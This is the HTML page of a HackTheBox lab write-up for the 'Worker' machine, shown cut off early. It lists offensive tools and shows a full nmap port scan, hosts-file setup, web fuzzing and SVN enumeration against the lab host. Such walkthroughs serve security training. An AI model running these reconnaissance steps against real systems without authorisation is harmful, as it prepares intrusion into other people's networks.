<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-writeups docs-doc-id-HackTheBox/Worker/write-up">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.4.1">
<title data-rh="true">Worker | CyFun</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://s4ch.github.io/img/cydesk.png"><meta data-rh="true" name="twitter:image" content="https://s4ch.github.io/img/cydesk.png"><meta data-rh="true" property="og:url" content="https://s4ch.github.io/writeups/HackTheBox/Worker/write-up/"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="robots" content="max-image-preview:large"><meta data-rh="true" name="monetization" content="$ilp.uphold.com/fYPB8Pjyig3z"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" property="og:title" content="Worker | CyFun"><meta data-rh="true" name="description" content="- Name: Worker"><meta data-rh="true" property="og:description" content="- Name: Worker"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://s4ch.github.io/writeups/HackTheBox/Worker/write-up/"><link data-rh="true" rel="alternate" href="https://s4ch.github.io/writeups/HackTheBox/Worker/write-up/" hreflang="en"><link data-rh="true" rel="alternate" href="https://s4ch.github.io/writeups/HackTheBox/Worker/write-up/" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="CyFun RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="CyFun Atom Feed">
<link rel="alternate" type="application/json" href="/blog/feed.json" title="CyFun JSON Feed">



<link rel="icon" href="/img/cy.png">
<link rel="manifest" href="/manifest.json">
<meta name="theme-color" content="rgb(37, 194, 160)">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#000">
<link rel="apple-touch-icon" href="/img/cy.png">
<link rel="mask-icon" href="/img/cy.png" color="rgb(62, 204, 94)">
<meta name="msapplication-TileImage" content="/img/cy.png">
<meta name="msapplication-TileColor" content="#000"><link rel="stylesheet" href="/assets/css/styles.ff01972a.css">
<link rel="preload" href="/assets/js/runtime~main.3415e7ae.js" as="script">
<link rel="preload" href="/assets/js/main.c90fa39a.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}return t}()||function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"dark")}()</script><div id="__docusaurus">
<div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/cy.png" alt="Logo" class="themedImage_ToTc themedImage--light_HNdA"><img src="/img/cy.png" alt="Logo" class="themedImage_ToTc themedImage--dark_i4oU"></div><b class="navbar__title text--truncate">CyFun</b></a><a class="navbar__item navbar__link" href="/blog/">Blog</a><a class="navbar__item navbar__link" href="/docs/">Threads</a><a class="navbar__item navbar__link" href="/ctf/">CTF</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/writeups/">Writeups</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/s4ch/s4ch.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently dark mode)" aria-label="Switch between dark and light mode (currently dark mode)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_ZlJk"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0 docsWrapper_BCFX"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docPage__5DB"><aside class="theme-doc-sidebar-container docSidebarContainer_b6E3"><div class="sidebarViewport_Xe31"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/writeups/">About</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" href="/writeups/HackTheBox/Academy/write-up/">HackTheBox</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Academy/write-up/">Academy</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Admirer/write-up/">Admirer</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Blackfield/write-up/">Blackfield</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Blunder/write-up/">Blunder</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Book/write-up/">Book</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Buff/write-up/">Buff</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Cache/write-up/">Cache</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Control/write-up/">Control</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/CyberSantaCTF/2021/write-up/">CyberSantaCTF</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Delivery/write-up/">Delivery</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Doctor/write-up/">Doctor</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Dyplesher/write-up/">Dyplesher</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Fatty/write-up/">Fatty</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ForwardSlash/write-up/">ForwardSlash</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Jewel/write-up/">Jewel</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Laboratory/write-up/">Laboratory</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Magic/write-up/">Magic</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Mango/write-up/">Mango</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Monteverde/write-up/">Monteverde</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Nest/write-up/">Nest</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Obscurity/write-up/">Obscurity</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Omni/write-up/">Omni</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Oouch/write-up/">Oouch</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/OpenAdmin/write-up/">OpenAdmin</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Passage/write-up/">Passage</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Ready/write-up/">Ready</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Remote/write-up/">Remote</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ScriptKiddie/write-up/">ScriptKiddie</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ServMon/write-up/">ServMon</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/SneakyMailer/write-up/">SneakyMailer</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Tabby/write-up/">Tabby</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Tenet/write-up/">Tenet</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Traceback/write-up/">Traceback</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Travel/write-up/">Travel</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Traverxec/write-up/">Traverxec</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" tabindex="0" href="/writeups/HackTheBox/Worker/write-up/">Worker</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/writeups/HackTheBox/Worker/write-up/">Worker </a></li></ul></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/writeups/Tryhackme/0day/">Tryhackme</a></div></li></ul></nav><button type="button" title="Collapse sidebar" aria-label="Collapse sidebar" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_gTbr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">HackTheBox</span><meta itemprop="position" content="1"></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Worker</span><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Worker </span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><h1>Information</h1><ul><li><strong>Name:</strong> Worker</li><li><strong>Profile:</strong> <a href="https://www.hackthebox.eu/home/machines/profile/270" target="_blank" rel="noopener noreferrer">www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Medium</li><li><strong>OS:</strong> Windows</li><li><strong>Points:</strong> 30</li></ul><p><img loading="lazy" alt="Worker" src="/assets/images/worker-506d70d3eb9afbc43f78c0c5c86a34e3.png" width="598" height="381" class="img_ev3q"></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="overview">Overview<a href="#overview" class="hash-link" aria-label="Direct link to Overview" title="Direct link to Overview">​</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ pacman -S nmap man ffuf subversion lynx metasploit crackmapexec evil-winrm</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="network-enumeration">Network enumeration<a href="#network-enumeration" class="hash-link" aria-label="Direct link to Network enumeration" title="Direct link to Network enumeration">​</a></h2><p>Let&#x27;s run a <!-- -->[nmap][nmap]<!-- --> scan to find port and services:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Nmap 7.80 scan initiated Tue Oct 20 20:33:43 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.10.10.203</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap scan report for 10.10.10.203</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host is up (0.023s latency).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Not shown: 65532 filtered ports</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PORT     STATE SERVICE  VERSION</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">80/tcp   open  http     Microsoft IIS httpd 10.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| http-methods:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  Potentially risky methods: TRACE</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-server-header: Microsoft-IIS/10.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-title: IIS Windows Server</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">3690/tcp open  svnserve Subversion</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-title: Not Found</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Read data files from: /usr/bin/../share/nmap</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Nmap done at Tue Oct 20 20:35:39 2020 -- 1 IP address (1 host up) scanned in 115.81 seconds</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>And add the local domain to our hosts file.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cat /etc/hosts | grep worker</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">10.10.10.203 worker.htb devops.worker.htb alpha.worker.htb cartoon.worker.htb lens.worker.htb solid-state.worker.htb spectral.worker.htb story.worker.htb</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="http-enumeration">HTTP enumeration<a href="#http-enumeration" class="hash-link" aria-label="Direct link to HTTP enumeration" title="Direct link to HTTP enumeration">​</a></h2><p><a href="http://worker.htb/" target="_blank" rel="noopener noreferrer">http://worker.htb/</a> is displaying the default IIS home page, but enumeration
with <a href="https://github.com/ffuf/ffuf" target="_blank" rel="noopener noreferrer">ffuf</a> gives nothing.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="svn">SVN<a href="#svn" class="hash-link" aria-label="Direct link to SVN" title="Direct link to SVN">​</a></h2><p>On port 3690 we have a SVN server. 3690 is the default port for
<a href="http://svnbook.red-bean.com/en/1.8/svn.ref.svnserve.re.html" target="_blank" rel="noopener noreferrer">svnserve</a> service.</p><blockquote><p>svnserve allows access to Subversion repositories using Subversion&#x27;s custom network protocol.</p><p>You can run svnserve as a standalone server process (for clients that are using the svn:// access method); you can have a daemon such as inetd or xinetd launch it for you on demand (also for svn://), or you can have sshd launch it on demand for the svn+ssh:// access method.</p></blockquote><p>So let&#x27;s find some information:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ svn info svn://worker.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Path: .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token 